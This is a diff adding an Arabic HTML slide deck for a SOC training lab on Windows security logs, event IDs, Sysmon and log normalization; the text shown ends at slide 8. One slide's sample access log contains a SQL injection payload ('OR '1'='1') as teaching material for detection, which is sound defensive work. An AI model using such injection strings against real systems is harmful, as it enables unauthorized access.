@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>المعمل 1 (الجزء الثاني) – السجلات الأمنية المؤسسية والتحليل الجنائي للأحداث</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg-primary: #070a14;
+      --bg-surface: #0e1326;
+      --bg-card: rgba(18, 26, 51, 0.7);
+      --bg-card-hover: rgba(28, 40, 77, 0.85);
+      --border: rgba(99, 130, 255, 0.15);
+      --border-glow: rgba(99, 130, 255, 0.35);
+      --blue-500: #3563e9;
+      --blue-400: #60a5fa;
+      --blue-300: #93c5fd;
+      --blue-600: #2563eb;
+      --purple-500: #7c3aed;
+      --purple-400: #a78bfa;
+      --cyan-400: #22d3ee;
+      --green-400: #4ade80;
+      --yellow-400: #facc15;
+      --red-400: #f87171;
+      --text-primary: #f1f5f9;
+      --text-secondary: #94a3b8;
+      --text-muted: #64748b;
+      --gradient-main: linear-gradient(135deg, #3563e9 0%, #7c3aed 100%);
+      --gradient-blue: linear-gradient(135deg, #60a5fa 0%, #3563e9 100%);
+      --gradient-card: linear-gradient(145deg, rgba(18, 26, 51, 0.8) 0%, rgba(10, 15, 30, 0.95) 100%);
+      --font-heading: 'Cairo', 'Space Grotesk', system-ui, sans-serif;
+      --font-body: 'Cairo', 'Outfit', system-ui, sans-serif;
+      --font-mono: 'JetBrains Mono', monospace;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      font-family: var(--font-body);
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      user-select: none;
+      -webkit-font-smoothing: antialiased;
+    }
+    .ambient-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
+    .ambient-glow { position: absolute; border-radius: 50%; filter: blur(120px); pointer-events: none; }
+    .ambient-glow-1 { width: 500px; height: 500px; background: rgba(53, 99, 233, 0.12); top: -150px; left: -100px; }
+    .ambient-glow-2 { width: 600px; height: 600px; background: rgba(124, 58, 237, 0.1); bottom: -150px; right: -150px; }
+    
+    .top-bar {
+      position: relative;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+      z-index: 10;
+      border-bottom: 1px solid var(--border);
+      background: rgba(7, 10, 20, 0.8);
+      backdrop-filter: blur(12px);
+    }
+    .progress-bar { position: absolute; top: 0; left: 0; height: 3px; background: var(--gradient-main); z-index: 11; transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+    .header-badge { display: inline-flex; align-items: center; gap: 8px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; color: var(--blue-400); }
+    .header-badge::before { content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--blue-400); box-shadow: 0 0 8px var(--blue-400); }
+    .header-slide-title { font-size: 0.85rem; color: var(--text-secondary); font-weight: 500; }
+
+    .deck { position: relative; flex: 1; width: 100%; height: calc(100vh - 108px); overflow: hidden; }
+    .slide {
+      position: absolute;
+      inset: 0;
+      padding: 40px 60px;
+      display: none;
+      flex-direction: column;
+      justify-content: flex-start;
+      overflow-y: auto;
+      z-index: 1;
+      opacity: 0;
+      transform: translateY(12px);
+      transition: opacity 0.25s ease, transform 0.25s ease;
+    }
+    .slide.active { display: flex; opacity: 1; transform: translateY(0); z-index: 2; }
+    .slide-inner { max-width: 1100px; width: 100%; margin: 0 auto; }
+
+    .section-label {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--blue-400);
+      margin-bottom: 8px;
+    }
+    .label-icon { font-size: 0.6rem; }
+    
+    h1 { font-family: var(--font-heading); font-size: 2.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 12px; }
+    h2 { font-family: var(--font-heading); font-size: 1.85rem; font-weight: 700; line-height: 1.25; margin-bottom: 12px; }
+    h3 { font-family: var(--font-heading); font-size: 1.25rem; font-weight: 600; margin-bottom: 8px; }
+    h4 { font-family: var(--font-heading); font-size: 1rem; font-weight: 600; margin-bottom: 6px; }
+    p { font-size: 0.95rem; line-height: 1.6; color: var(--text-secondary); margin-bottom: 12px; }
+    
+    .gradient-text { background: var(--gradient-main); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .blue { color: var(--blue-400); }
+    .purple { color: var(--purple-400); }
+    .yellow { color: var(--yellow-400); }
+    .green { color: var(--green-400); }
+    .red { color: var(--red-400); }
+    .mono { font-family: var(--font-mono); }
+
+    .card-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 16px; margin: 16px 0; }
+    .card-row--2 { grid-template-columns: repeat(2, 1fr); }
+    .card-row--3 { grid-template-columns: repeat(3, 1fr); }
+    .card-row--4 { grid-template-columns: repeat(4, 1fr); }
+    .card {
+      background: var(--gradient-card);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px 20px;
+      display: flex;
+      flex-direction: column;
+      transition: transform 0.2s ease, border-color 0.2s ease;
+    }
+    .card:hover { transform: translateY(-3px); border-color: var(--border-glow); }
+    .card h4 { color: var(--text-primary); display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+    .card p { font-size: 0.85rem; margin-bottom: 0; }
+
+    .tag { display: inline-flex; align-items: center; padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: 700; font-family: var(--font-mono); text-transform: uppercase; }
+    .tag--blue { background: rgba(53, 99, 233, 0.2); color: var(--blue-300); border: 1px solid rgba(53, 99, 233, 0.4); }
+    .tag--purple { background: rgba(124, 58, 237, 0.2); color: var(--purple-400); border: 1px solid rgba(124, 58, 237, 0.4); }
+    .tag--green { background: rgba(74, 222, 128, 0.15); color: var(--green-400); border: 1px solid rgba(74, 222, 128, 0.3); }
+    .tag--yellow { background: rgba(250, 204, 21, 0.15); color: var(--yellow-400); border: 1px solid rgba(250, 204, 21, 0.3); }
+    .tag--red { background: rgba(248, 113, 113, 0.15); color: var(--red-400); border: 1px solid rgba(248, 113, 113, 0.3); }
+
+    .terminal {
+      background: #030712;
+      border: 1px solid rgba(99, 130, 255, 0.25);
+      border-radius: 8px;
+      overflow: hidden;
+      margin: 14px 0;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+    .terminal-bar {
+      background: #0b1120;
+      padding: 6px 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      font-size: 0.72rem;
+      color: var(--text-muted);
+      font-family: var(--font-mono);
+    }
+    .terminal-dot { width: 8px; height: 8px; border-radius: 50%; }
+    .terminal-dot--red { background: #ef4444; }
+    .terminal-dot--yellow { background: #f59e0b; }
+    .terminal-dot--green { background: #10b981; }
+    .terminal-body {
+      padding: 12px 16px;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      line-height: 1.55;
+      color: #e2e8f0;
+      overflow-x: auto;
+      white-space: pre;
+    }
+
+    .table-wrap { margin: 16px 0; overflow-x: auto; }
+    table.data-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.85rem;
+      background: var(--bg-card);
+      border-radius: 8px;
+      overflow: hidden;
+      border: 1px solid var(--border);
+    }
+    table.data-table th {
+      background: rgba(37, 99, 235, 0.15);
+      color: var(--blue-300);
+      padding: 10px 14px;
+      text-align: left;
+      font-weight: 600;
+      border-bottom: 1px solid var(--border);
+    }
+    table.data-table td {
+      padding: 10px 14px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      color: var(--text-primary);
+    }
+    table.data-table tr:hover td { background: rgba(255, 255, 255, 0.02); }
+
+    .callout-box {
+      background: rgba(37, 99, 235, 0.08);
+      border-left: 4px solid var(--blue-500);
+      border-radius: 0 8px 8px 0;
+      padding: 12px 18px;
+      margin: 14px 0;
+    }
+    .callout-box--warn { background: rgba(245, 158, 11, 0.08); border-left-color: var(--yellow-400); }
+    .callout-box--red { background: rgba(239, 68, 68, 0.08); border-left-color: var(--red-400); }
+    .callout-box h4 { font-size: 0.9rem; margin-bottom: 4px; }
+    .callout-box p { font-size: 0.85rem; margin-bottom: 0; color: var(--text-primary); }
+
+    .bottom-bar {
+      position: relative;
+      height: 56px;
+      background: rgba(7, 10, 20, 0.95);
+      border-top: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+      z-index: 10;
+    }
+    .nav-controls { display: flex; align-items: center; gap: 8px; }
+    .nav-btn {
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid var(--border);
+      color: var(--text-primary);
+      height: 32px;
+      padding: 0 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.85rem;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s, border-color 0.15s, transform 0.1s;
+    }
+    .nav-btn:hover { background: rgba(255, 255, 255, 0.12); border-color: var(--blue-400); }
+    .nav-btn:active { transform: scale(0.97); }
+    .nav-btn--notes { background: rgba(53, 99, 233, 0.2); border-color: var(--blue-500); color: var(--blue-300); }
+    .nav-btn--notes.active { background: var(--blue-600) !important; color: #fff !important; box-shadow: 0 0 12px rgba(37, 99, 235, 0.5); }
+    .slide-counter { font-family: var(--font-mono); font-size: 0.82rem; color: var(--text-muted); }
+
+    /* Speaker Notes Overlay */
+    #speaker-notes-overlay {
+      position: fixed;
+      bottom: 68px;
+      right: 24px;
+      width: 480px;
+      max-width: calc(100vw - 48px);
+      max-height: 420px;
+      background: rgba(7, 10, 20, 0.96);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--blue-500);
+      border-radius: 12px;
+      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.65), 0 0 24px rgba(53, 99, 233, 0.25);
+      z-index: 99999 !important;
+      display: none;
+      flex-direction: column;
+      overflow: hidden;
+      animation: notesFadeIn 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    #speaker-notes-overlay.active { display: flex !important; }
+    @keyframes notesFadeIn {
+      from { opacity: 0; transform: translateY(12px) scale(0.97); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .notes-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px;
+      border-bottom: 1px solid var(--border);
+      background: rgba(255, 255, 255, 0.03);
+    }
+    .notes-title { font-size: 0.85rem; font-weight: 700; color: var(--blue-400); display: flex; align-items: center; gap: 6px; }
+    .notes-close { background: none; border: none; color: var(--text-muted); font-size: 1.25rem; cursor: pointer; padding: 0 4px; line-height: 1; border-radius: 4px; }
+    .notes-close:hover { color: #fff; background: rgba(255, 255, 255, 0.08); }
+    .notes-body { padding: 16px; overflow-y: auto; font-size: 0.95rem; line-height: 1.65; color: var(--text-primary); font-family: var(--font-body); }
+    .notes-empty { color: var(--text-muted); font-style: italic; }
+
+    
+    body { direction: rtl; text-align: right; }
+    pre, code, .mono, .cmd-line, .terminal-window, .code-snippet, .terminal-body { direction: ltr; text-align: left; display: inline-block; font-family: var(--font-mono); width: 100%; box-sizing: border-box; }
+    .section-label { letter-spacing: normal; }
+    #speaker-notes-overlay { left: 24px !important; right: auto !important; text-align: right !important; direction: rtl !important; }
+    .notes-header { direction: rtl; }
+    .notes-close { margin-right: auto; margin-left: 0; }
+        
+  </style>
+</head>
+<body>
+  <div class="ambient-bg">
+    <div class="ambient-glow ambient-glow-1"></div>
+    <div class="ambient-glow ambient-glow-2"></div>
+  </div>
+
+  <div class="top-bar">
+    <div class="progress-bar" id="progress-bar"></div>
+    <div class="header-badge">المعمل 1 (الجزء الثاني) – السجلات الأمنية المؤسسية والتحليل الجنائي للأحداث</div>
+    <div class="header-slide-title" id="header-slide-title"></div>
+  </div>
+
+  <div class="deck" id="deck">
+
+    <div class="slide" data-slide="0" data-title="المقدمة إلى السجلات المؤسسية" data-notes="رحب بالطلاب في الجزء الثاني من المعمل الأول. أكد لهم أن السجلات (Logs) هي شريان الحياة والعملة الأساسية لأي مركز عمليات أمنية (SOC). يقضي محلل الـ SOC أكثر من 80% من يومه في قراءة السجلات والاستعلام عنها وتحليلها وربط خيوطها لكشف الهجمات. سننتقل في هذه الجلسة من المفاهيم النظرية إلى التحليل الجنائي العملي الحقيقي.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> بيانات وسجلات مركز العمليات (SOC TELEMETRY)</div>
+        
+        <h1>السجلات الأمنية المؤسسية و<br /><span class="gradient-text">التحليل الجنائي للأحداث (Event Analysis)</span></h1>
+        <p style="font-size: 1.15rem; margin-top: 10px;">الدليل التأسيسي الشامل لتشريح السجلات، معرفات أحداث ويندوز (Event IDs)، قياسات Sysmon، وكشف الهجمات داخل السجلات الخام.</p>
+        <div style="margin-top: 24px; padding: 12px 18px; background: rgba(53,99,233,0.1); border: 1px solid var(--border-glow); border-radius: 8px; display: inline-block;">
+          <span style="color: var(--blue-300); font-weight: 600;">المعمل 1 — الجزء الثاني: الغوص العميق في السجلات والـ Telemetry</span><br>
+          <span style="color: var(--text-muted); font-size: 0.85rem;">إعداد وتقديم المحاضر: <strong style="color: var(--text-primary);">Hussein Al-Selwi</strong></span>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="1" data-title="أهداف المعمل التعليمية" data-notes="استعرض الأهداف التعليمية ليعرف الطلاب ما سيكتسبونه بنهاية الجلسة: فهم تشريح السجل، حفظ المعرفات الحرجة لويندوز، فهم سبب حتمية تثبيت Sysmon، وقراءة سيناريوهات الهجمات الحقيقية داخل ملفات السجلات.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> أهداف الجلسة التدريبية</div>
+        
+        <h2>ما ستتقنه بنهاية هذا المعمل</h2>
+        <p>بنهاية هذه الوحدة، سيمتلك كل طالب المهارات الجوهرية التي يحتاجها محلل الـ SOC لقراءة وفرز السجلات الأمنية في بيئات العمل الحقيقية:</p>
+        <div class="card-row card-row--2">
+          <div class="card">
+            <h4><span class="blue">1. تشريح وبنية السجلات (Log Anatomy)</span></h4>
+            <p>تفكيك أي سجل خام إلى أركانه الجنائية الخمسة: التوقيت الموحد (UTC)، المصدر، معرف الحدث، الهوية الفاعلة، ومحتوى الرسالة.</p>
+          </div>
+          <div class="card">
+            <h4><span class="purple">2. معرفات أحداث ويندوز الحرجة (Windows Event IDs)</span></h4>
+            <p>حفظ وفهم المعرفات الأمنية الأساسية (4624, 4625, 4688, 7045, 1102) ودلالاتها الجنائية في كشف الاختراقات.</p>
+          </div>
+          <div class="card">
+            <h4><span class="cyan">3. قياسات Sysmon المتقدمة</span></h4>
+            <p>إدراك أسباب عدم كفاية سجلات ويندوز الافتراضية، وكيف يوفر Sysmon قيم الهاش (Hashes) وتتبع العمليات واتصالات الشبكة.</p>
+          </div>
+          <div class="card">
+            <h4><span class="yellow">4. تواقيع الهجمات داخل السجلات</span></h4>
+            <p>تتبع سيناريوهات هجمات واقعية في السجلات: تخمين كلمات المرور (Brute Force)، البقاء عبر الخدمات (Persistence)، ومسح السجلات (Log Wiping).</p>
+          </div>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="2" data-title="ما هو السجل الأمني؟ الشاهد الرقمي الصامت" data-notes="عرّف السجل بوضوح: إنه سجل تدقيق غير قابل للتغيير يُولد تلقائياً بواسطة الأنظمة. إذا وقع أي حدث في الحاسوب، فيجب أن يترك أثراً في السجلات. لا يمكن للمهاجم التخفي إلا إذا عطل السجلات أو مسحها، وعملية المسح نفسها تُولد حدثاً مشبوهاً يُفضحه.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> المفاهيم التأسيسية</div>
+        
+        <h2>ما هو السجل الأمني (Security Log)؟</h2>
+        <p>الـ <strong class="blue">Log</strong> هو سجل زمني غير قابل للتعديل يُولد تلقائياً لتوثيق حدوث واقعة أو عملية برمجية أو معاملة شبكية داخل نظام التشغيل أو التطبيق أو جهاز الشبكة.</p>
+        <div class="callout-box">
+          <h4>💡 القاعدة الذهبية للتحقيق الجنائي والاستجابة للحوادث</h4>
+          <p>"في الأمن السيبراني: إذا لم يتم تسجيل الحدث في السجلات، فمن الناحية الجنائية والقانونية لم يحدث قط — وعلى النقيض، إذا قام المهاجم بأي حركة على النظام، فإنه حتماً ترك بصمة رقمية في السجلات."</p>
+        </div>
+        <div class="card-row card-row--3">
+          <div class="card">
+            <h4>1. الشاهد الرقمي الموثوق</h4>
+            <p>يوثق ما تم تشغيله، ومن الذي سجل دخوله، وما الاتصال الذي فُتح، وما الملف الذي عُدّل بدقة متناهية.</p>
+          </div>
+          <div class="card">
+            <h4>2. إعادة بناء الجدول الزمني</h4>
+            <p>يمكّن المحققين من إعادة تمثيل خطوات الهجوم خطوة بخطوة من جهاز الضحية الأول وحتى تسريب البيانات.</p>
+          </div>
+          <div class="card">
+            <h4>3. الالتزام الرقابي والقانوني</h4>
+            <p>تفرضه المعايير الدولية والوطنية (NIST, ISO 27001, PCI-DSS) لضمان المساءلة والتوثيق القانوني للاختراقات.</p>
+          </div>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="3" data-title="تشريح السجل الأمني: الأركان الجنائية الخمسة" data-notes="كل سجل أمني مهما اختلف نظامه يجيب عن خمسة أسئلة رئيسية: متى (Timestamp)، أين (المصدر والوجهة)، ماذا حدث (معرف الحدث)، من الفاعل (المستخدم)، وكيف تم ذلك (التفاصيل والـ Payload). درب الطلاب على استخراج هذه الحقول الخمسة فوراً بمجرد فتح أي تنبيه.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> بنية وهيكل السجلات</div>
+        
+        <h2>الأركان الجنائية الخمسة لأي سجل أمني</h2>
+        <p>عندما يفتح محلل الـ SOC أي سجل داخل نظام الـ SIEM، فإنه يبحث فوراً عن إجابات واضحة لخمسة أسئلة جوهرية:</p>
+        <div class="card-row card-row--2" style="margin-top: 14px;">
+          <div class="card">
+            <h4><span class="blue">1. متى حدث؟ — التوقيت (Timestamp UTC)</span></h4>
+            <p>تاريخ ووقت الحدث بدقة أجزاء الثانية. <em>يجب توحيد كافة أجهزة الشبكة بتوقيت UTC عبر بروتوكول NTP.</em></p>
+          </div>
+          <div class="card">
+            <h4><span class="purple">2. أين حدث؟ — المصدر والوجهة (Source &amp; Dest)</span></h4>
+            <p>اسم الجهاز، عنوان الـ IP والمنفذ المصدر (Source IP:Port)، وعنوان الـ IP والمنفذ المستهدف (Dest IP:Port).</p>
+          </div>
+          <div class="card">
+            <h4><span class="cyan">3. ماذا حدث؟ — معرف الحدث والإجراء (Event ID)</span></h4>
+            <p>الرمز التعريفي للحدث ونوع الإجراء: تسجيل دخول، فشل، إنشاء عملية، حجب اتصال، أو تعديل ملف.</p>
+          </div>
+          <div class="card">
+            <h4><span class="yellow">4. من الفاعل؟ — الهوية والمستخدم (User Identity)</span></h4>
+            <p>اسم حساب المستخدم، المعرف الأمني (SID)، رقم جلسة الدخول (Logon ID)، أو اسم حساب الخدمة (Service Account).</p>
+          </div>
+        </div>
+        <div class="callout-box" style="margin-top: 10px;">
+          <h4>5. كيف تم وما التفاصيل؟ — المحتوى والسياق (Payload &amp; Details)</h4>
+          <p>البيانات السياقية الملحقة: سطر الأوامر المنفذ بالكامل، معرّف العملية الأب والابن (Parent/Child PID)، قيمة الهاش، ومسارات الملفات المعدلة.</p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="4" data-title="السجلات الخام مقابل السجلات المهيكلة (Raw vs Normalized)" data-notes="اشرح الفارق بين سطر السجل الخام غير المهيكل (الذي يصعب البحث فيه بسرعة عبر ملايين الأسطر) والسجل المهيكل في صيغة JSON بعد معالجته داخل الـ SIEM. توحيد السجلات (Normalization) يحول حقول عشرات الشركات إلى حقول قياسية موحدة مثل src_ip و user.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> تحويل وهندسة البيانات</div>
+        
+        <h2>من نصوص خام مشتتة إلى بيانات استخبارية قابلة للبحث</h2>
+        <p>تُصدر الأجهزة الأمنية المختلفة السجلات بمئات الصياغات المتضاربة. يقوم الـ SIEM بتفكيكها وتوحيدها وفق نموذج مشترك (Common Schema):</p>
+        
+        <h4>سطر سجل خام غير مهيكل (Raw Log)</h4>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="terminal-dot terminal-dot--red"></span><span class="terminal-dot terminal-dot--yellow"></span><span class="terminal-dot terminal-dot--green"></span> raw_access.log</div>
+          <div class="terminal-body">192.168.1.105 - admin [21/Oct/2026:02:15:33 +0000] "GET /login.php?user=admin' OR '1'='1 HTTP/1.1" 200 4522 "https://corp.local/" "Mozilla/5.0"</div>
+        </div>
+
+        <h4>السجل بعد المعالجة والتوحيد داخل الـ SIEM (JSON / Key-Value)</h4>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="terminal-dot terminal-dot--green"></span> المعالجة والتوحيد القياسي (Splunk CIM / Elastic ECS)</div>
+          <div class="terminal-body">{
+  "timestamp": "2026-10-21T02:15:33.000Z",
+  "src_ip": "192.168.1.105",
+  "user": "admin",
+  "http_method": "GET",
+  "url_path": "/login.php",
+  "query_string": "user=admin' OR '1'='1",
+  "http_status": 200,
+  "threat_category": "SQL_INJECTION_ATTEMPT"
+}</div>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="5" data-title="أهم مصادر السجلات في مركز العمليات (Log Sources)" data-notes="قدم تصنيفاً شاملاً لمصادر السجلات في المؤسسات. مركز الـ SOC لا يراقب جهازاً واحداً بل يجمع السجلات من النقاط الطرفية، الـ Active Directory، جدران الحماية، خوادم الـ DNS، خوادم الويب، والسحابة.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> تغطية البيئة المؤسسية</div>
+        
+        <h2>من أين تأتي السجلات إلى مركز العمليات؟</h2>
+        <p>يقوم مركز الـ SOC الحقيقي بجمع السجلات من كافة طبقات البنية التحتية للقضاء على أي نقاط عمياء (Blind Spots):</p>
+        <div class="card-row card-row--3">
+          <div class="card">
+            <h4><span class="blue">1. سجلات الأجهزة والنقاط الطرفية</span></h4>
+            <p>سجلات ويندوز (Event Logs)، سجلات لينكس (Syslog)، قياسات مستشعرات الـ EDR، وسجلات Sysmon لمراقبة العمليات.</p>
+          </div>
+          <div class="card">
+            <h4><span class="purple">2. سجلات الهوية والتحقق (Identity)</span></h4>
+            <p>سجلات خوادم الدومين (Active Directory)، طلبات بروتوكول Kerberos، بوابات الدخول الموحد (Azure AD / Okta)، وتنبيهات فشل الـ MFA.</p>
+          </div>
+          <div class="card">
+            <h4><span class="cyan">3. سجلات الشبكة والمحيط (Perimeter)</span></h4>
+            <p>سجلات الجدران النارية (Firewall Traffic)، سجلات اتصالات الـ VPN، استعلامات الـ DNS، وسجلات خوادم الـ Proxy.</p>
+          </div>
+          <div class="card">
+            <h4><span class="yellow">4. سجلات التطبيقات وخوادم الويب</span></h4>
+            <p>سجلات وصول وأخطاء خوادم Apache و Nginx و IIS، وسجلات قواعد البيانات (SQL Server, Oracle, MySQL).</p>
+          </div>
+          <div class="card">
+            <h4><span class="green">5. تنبيهات الأدوات الأمنية</span></h4>
+            <p>سجلات مضادات الفيروسات، تنبيهات أنظمة كشف التطفل (Snort/Zeek)، وتقارير بوابات البريد عن الرسائل المحجوبة.</p>
+          </div>
+          <div class="card">
+            <h4><span class="red">6. سجلات البيئات السحابية (Cloud)</span></h4>
+            <p>سجلات AWS CloudTrail، سجلات نشاط Microsoft Azure، وسجلات تدقيق Google Cloud وبيئات الحاويات (Kubernetes).</p>
+          </div>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="6" data-title="معمارية سجلات ويندوز (Windows Event Logs)" data-notes="اشرح كيف يخزن ويندوز سجلاته في قنوات وملفات ثنائية بامتداد evtx داخل المسار System32\winevt\Logs. ركز على التمييز بين سجلات الأمان والنظام والتطبيقات، وكيف تقرأها أداة Event Viewer.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> أمن أنظمة ويندوز</div>
+        
+        <h2>معمارية وهيكلية سجلات نظام ويندوز</h2>
+        <p>يخزن نظام ويندوز السجلات المشفرة بصيغة XML الثنائية داخل ملفات بامتداد <code class="mono">.evtx</code> في المجلد <code class="mono">C:\Windows\System32\winevt\Logs\</code>:</p>
+        
+        <div class="card-row card-row--3" style="margin-top: 16px;">
+          <div class="card">
+            <h4><span class="red">سجل الأمان (Security.evtx)</span></h4>
+            <p><strong>السجل الأهم لمحلل الـ SOC.</strong> يوثق تسجيل الدخول والخروج، استخدام الصلاحيات، إدارة المستخدمين، وإنشاء العمليات. الوصول إليه مقصور على المسؤول فقط.</p>
+          </div>
+          <div class="card">
+            <h4><span class="blue">سجل النظام (System.evtx)</span></h4>
+            <p>يوثق أحداث مكونات نظام التشغيل: تحميل برامج التشغيل (Drivers)، تشغيل وإيقاف الخدمات، وأخطاء العتاد والإقلاع.</p>
+          </div>
+          <div class="card">
+            <h4><span class="purple">سجل التطبيقات (Application.evtx)</span></h4>
+            <p>يوثق الأحداث المسجلة بواسطة البرامج المثبتة وقواعد البيانات والتطبيقات الخارجية (مثل أعطال البرامج وتنبيهات مكافح الفيروسات).</p>
+          </div>
+        </div>
+
+        <div class="callout-box" style="margin-top: 16px;">
+          <h4>🔍 قنوات التحقيق الجنائي المتقدمة</h4>
+          <p>بالإضافة للقنوات الكلاسيكية الثلاث، يمتلك ويندوز قنوات حرجة للتحقيق: <code>Microsoft-Windows-Sysmon/Operational</code>، و <code>Microsoft-Windows-PowerShell/Operational</code> (لتسجيل أوامر باور شيل)، و <code>TaskScheduler/Operational</code>.</p>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="7" data-title="جدول معرفات أحداث ويندوز الجوهرية (Windows Event IDs)" data-notes="استعرض هذا الجدول الرئيسي بتركيز شديد. في أي مقابلة عمل لمحلل SOC يُسأل المرشح حتماً عن 4624 و 4625 و 4688 و 7045 و 1102. أكد للطلاب أن حفظ هذه الأرقام وفهم دلالاتها ليس خياراً بل ضرورة مهنية.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> المعرفات الأساسية للـ SOC</div>
+        
+        <h2>جدول أهم معرفات الأحداث الأمنية في ويندوز (Event IDs)</h2>
+        <p>يجب على كل محلل أمني حفظ هذه المعرفات الجوهرية — فهي حجر الزاوية لكافة قواعد الكشف والتنبيهات في الـ SIEM:</p>
+        <div class="table-wrap">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>معرف الحدث (Event ID)</th>
+                <th>اسم الحدث في النظام</th>
+                <th>الأهمية الجنائية لمحلل الـ SOC</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><span class="tag tag--green">4624</span></td>
+                <td>Successful Logon (نجاح الدخول)</td>
+                <td>تحديد المستخدم، الجهاز، ونوع الدخول (محلي Logon Type 2، شبكي 3، أو عن بعد RDP 10).</td>
+              </tr>
+              <tr>
+                <td><span class="tag tag--red">4625</span></td>
+                <td>Failed Logon (فشل الدخول)</td>
+                <td>كشف هجمات التخمين وكسر كلمات المرور (Brute Force) ومحاولات الدخول غير المصرح بها.</td>
+              </tr>
+              <tr>
+                <td><span class="tag tag--yellow">4672</span></td>
+                <td>Special Privileges Assigned</td>
+                <td>كشف تسجيل الدخول بصلاحيات المسؤول الإداري الأعلى (Administrator) وتصعيد الصلاحيات.</td>
+              </tr>
+              <tr>
+                <td><span class="tag tag--blue">4688</span></td>
+                <td>New Process Created (إنشاء عملية)</td>
+                <td>تتبع البرامج التنفيذية المشغلة، العملية الأب، وسطور الأوامر الكاملة (Command Lines).</td>
+              </tr>
+              <tr>
+                <td><span class="tag tag--purple">7045</span></td>
+                <td>New Service Installed (تثبيت خدمة)</td>
+                <td>كشف آليات بقاء المهاجم (Persistence) وأدوات الحركة الجانبية الخبيثة (مثل PsExec).</td>
+              </tr>
+              <tr>
+                <td><span class="tag tag--blue">4720</span></td>
+                <td>User Account Created (إنشاء حساب)</td>
+                <td>كشف إنشاء حسابات خلفية (Backdoor Accounts) غير مصرح بها للسيطرة الدائمة.</td>
+              </tr>
+              <tr>
+                <td><span class="tag tag--red">1102</span></td>
+                <td>Audit Log Cleared (مسح السجلات)</td>
+                <td>إنذار أحمر عالي الخطورة! يدل على قيام المهاجم بمسح السجلات لطمس آثاره الجنائية.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+            
+      </div>
+    </div>
+
+    <div class="slide" data-slide="8" data-title="التحقيق في حدث 4624: أنواع تسجيل الدخول (Logon Types)" data-notes="وضح للطلاب أن حدث نجاح الدخول 4624 لا قيمة له دون فحص حقل نوع الدخول (Logon Type). النوع 2 يعني جلوساً فعلياً أمام الشاشة، والنوع 3 مشاركة شبكية عبر SMB، والنوع 10 دخول عن بعد عبر RDP. إذا سجل موظف عادي دخوله بنوع 10 في الثالثة فجراً من عنوان خارجي، فهذه حادثة مؤكدة.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> تحليل المصادقة والهويات</div>
+        
+        <h2>تفكيك حدث نجاح الدخول 4624: أهمية حقل (Logon Type)</h2>
